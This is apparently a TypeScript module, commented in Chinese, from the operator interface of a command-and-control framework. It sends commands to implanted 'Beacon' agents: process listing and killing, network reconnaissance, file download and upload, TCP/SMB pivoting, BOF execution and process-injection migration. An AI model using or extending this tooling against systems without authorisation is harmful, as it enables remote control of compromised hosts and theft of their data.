/**
 * Beacon 命令发送模块 - 封装各类 Beacon 命令的发送函数
 *
 * 将底层 sendCommand 调用包装为语义化的命令函数，
 * 简化上层组件对各类命令的调用方式。
 */

// ─── 导入 ───

import { COMMAND_ID, PLUGIN_COMMAND_ID } from '../../../constants/commands'
import { sendCommand } from '../api/beaconApi'
import type { ApiOperationResult } from '../../../shared/api/types'

// ─── 通用命令 ───

/**
 * 发送通用 Beacon 命令
 * @param beaconid - 目标 Beacon ID
 * @param commandId - 命令 ID
 * @param args - 命令参数
 */
export function sendBeaconCommand(beaconid: string, commandId: number, args: unknown[] = []): Promise<ApiOperationResult> {
  return sendCommand(beaconid, commandId, args)
}

/**
 * 发送 Sleep 命令，设置 Beacon 回连间隔
 * @param beaconid - 目标 Beacon ID
 * @param sleeptime - 休眠时间（毫秒）
 * @param jitter - 抖动百分比
 */
export function sendSleepCommand(beaconid: string, sleeptime: number, jitter: number): Promise<ApiOperationResult> {
  return sendCommand(beaconid, COMMAND_ID.SLEEP, [sleeptime, jitter])
}

/**
 * 请求 Beacon 返回进程列表
 * @param beaconid - 目标 Beacon ID
 */
export function sendProcessListCommand(beaconid: string): Promise<ApiOperationResult> {
  return sendCommand(beaconid, COMMAND_ID.PS, [])
}

/**
 * 发送 Kill 命令终止指定进程
 * @param beaconid - 目标 Beacon ID
 * @param pid - 目标进程 PID
 */
export function sendKillProcessCommand(beaconid: string, pid: number): Promise<ApiOperationResult> {
  return sendCommand(beaconid, COMMAND_ID.KILL || 42, [pid])
}

/**
 * 请求 Beacon 返回网络接口信息
 * @param beaconid - 目标 Beacon ID
 */
export function sendNetworkInfoCommand(beaconid: string): Promise<ApiOperationResult> {
  return sendCommand(beaconid, COMMAND_ID.NETINFO, [])
}

/**
 * 请求 Beacon 返回网络连接列表
 * @param beaconid - 目标 Beacon ID
 */
export function sendNetworkStatCommand(beaconid: string): Promise<ApiOperationResult> {
  return sendCommand(beaconid, COMMAND_ID.NETSTAT, [])
}

/**
 * 同时发送网络信息和网络连接查询
 * @param beaconid - 目标 Beacon ID
 */
export function sendNetworkBrowserCommands(beaconid: string): Promise<[ApiOperationResult, ApiOperationResult]> {
  return Promise.all([
    sendNetworkInfoCommand(beaconid),
    sendNetworkStatCommand(beaconid),
  ])
}

/**
 * 请求 Beacon 返回当前工作目录
 * @param beaconid - 目标 Beacon ID
 */
export function sendPwdCommand(beaconid: string): Promise<ApiOperationResult> {
  return sendCommand(beaconid, COMMAND_ID.PWD, [])
}

/**
 * 发送 setattr 命令修改文件属性
 * @param beaconid - 目标 Beacon ID
 * @param args - setattr 参数
 */
export function sendSetAttrCommand(beaconid: string, args: unknown[]): Promise<ApiOperationResult> {
  return sendCommand(beaconid, COMMAND_ID.SETATTR, args)
}

/**
 * 发送 zip 命令压缩目录
 * @param beaconid - 目标 Beacon ID
 * @param sourcePath - 源目录路径
 * @param zipPath - 输出 zip 路径
 * @param overwrite - 是否覆盖
 * @param includeRoot - 是否包含根目录
 */
export function sendZipCommand(beaconid: string, sourcePath: string, zipPath: string, overwrite: number, includeRoot: number): Promise<ApiOperationResult> {
  return sendCommand(beaconid, COMMAND_ID.ZIP, [sourcePath, zipPath, overwrite, includeRoot])
}

// ─── 文件操作命令 ───

/**
 * 发送下载命令，从 Beacon 下载远程文件
 * @param beaconid - 目标 Beacon ID
 * @param remotePath - 远程文件路径
 * @param chunkSize - 分块大小
 * @param retries - 重试次数
 */
export function sendDownloadCommand(beaconid: string, remotePath: string, chunkSize = 524288, retries = 3): Promise<ApiOperationResult> {
  return sendCommand(beaconid, COMMAND_ID.DOWNLOAD, [remotePath, chunkSize, retries])
}

/**
 * 发送 rm 命令删除远程文件
 * @param beaconid - 目标 Beacon ID
 * @param remotePath - 远程文件路径
 */
export function sendRemoveFileCommand(beaconid: string, remotePath: string): Promise<ApiOperationResult> {
  return sendCommand(beaconid, COMMAND_ID.RM, [remotePath])
}

/**
 * 发送 mv 命令移动远程文件
 * @param beaconid - 目标 Beacon ID
 * @param sourcePath - 源路径
 * @param destinationPath - 目标路径
 */
export function sendMoveFileCommand(beaconid: string, sourcePath: string, destinationPath: string): Promise<ApiOperationResult> {
  return sendCommand(beaconid, COMMAND_ID.MV, [sourcePath, destinationPath])
}

/**
 * 发送 cp 命令复制远程文件
 * @param beaconid - 目标 Beacon ID
 * @param sourcePath - 源路径
 * @param destinationPath - 目标路径
 */
export function sendCopyFileCommand(beaconid: string, sourcePath: string, destinationPath: string): Promise<ApiOperationResult> {
  return sendCommand(beaconid, COMMAND_ID.CP, [sourcePath, destinationPath])
}

/**
 * 发送 mkdir 命令创建远程目录
 * @param beaconid - 目标 Beacon ID
 * @param remotePath - 目录路径
 */
export function sendMkdirCommand(beaconid: string, remotePath: string): Promise<ApiOperationResult> {
  return sendCommand(beaconid, COMMAND_ID.MKDIR, [remotePath])
}

/**
 * 发送上传命令，将文件上传到 Beacon 所在主机
 * @param beaconid - 目标 Beacon ID
 * @param fileId - 服务端文件 ID
 * @param remotePath - 远程目标路径
 * @param chunkSize - 分块大小
 */
export function sendUploadCommand(beaconid: string, fileId: string, remotePath: string, chunkSize = 524288): Promise<ApiOperationResult> {
  return sendCommand(beaconid, COMMAND_ID.UPLOAD, [fileId, remotePath, chunkSize])
}

// ─── 级联与插件命令 ───

/**
 * 发送级联连接命令（TCP / SMB）
 * @param beaconid - 父 Beacon ID
 * @param mode - 连接模式 ('tcp' | 'smb')
 * @param args - 连接参数
 */
export function sendCascadeConnectCommand(beaconid: string, mode: string, args: unknown[]): Promise<ApiOperationResult> {
  const commandId = mode === 'tcp' ? COMMAND_ID.CASCADE_CONNECT_TCP : COMMAND_ID.CASCADE_LINK_SMB
  return sendCommand(beaconid, commandId, args)
}

/**
 * 发送 BOF 执行命令
 * @param beaconid - 目标 Beacon ID
 * @param args - BOF 参数（第一个为工件 bytes）
 */
export function sendExecutionBofCommand(beaconid: string, args: unknown[]): Promise<ApiOperationResult> {
  return sendCommand(beaconid, PLUGIN_COMMAND_ID.EXECUTION_BOF, args)
}

/**
 * 发送 migrate_inject 命令，按现有 migrate 子协议生成新的 Beacon。
 * @param beaconid - 当前父 Beacon ID
 * @param listenerName - 目标 listener 名称
 * @param arch - 目标进程架构 (x86 | x64)
 * @param pid - 目标进程 PID
 */
export function sendMigrateInjectCommand(beaconid: string, listenerName: string, arch: string, pid: number | string): Promise<ApiOperationResult> {
  return sendCommand(beaconid, COMMAND_ID.MIGRATE, [3, listenerName, arch, Number(pid)])
}

/**
 * 发送退出命令，终止 Beacon 进程
 * @param beaconid - 目标 Beacon ID
 */
export function sendExitCommand(beaconid: string): Promise<ApiOperationResult> {
  return sendCommand(beaconid, COMMAND_ID.EXIT)
}
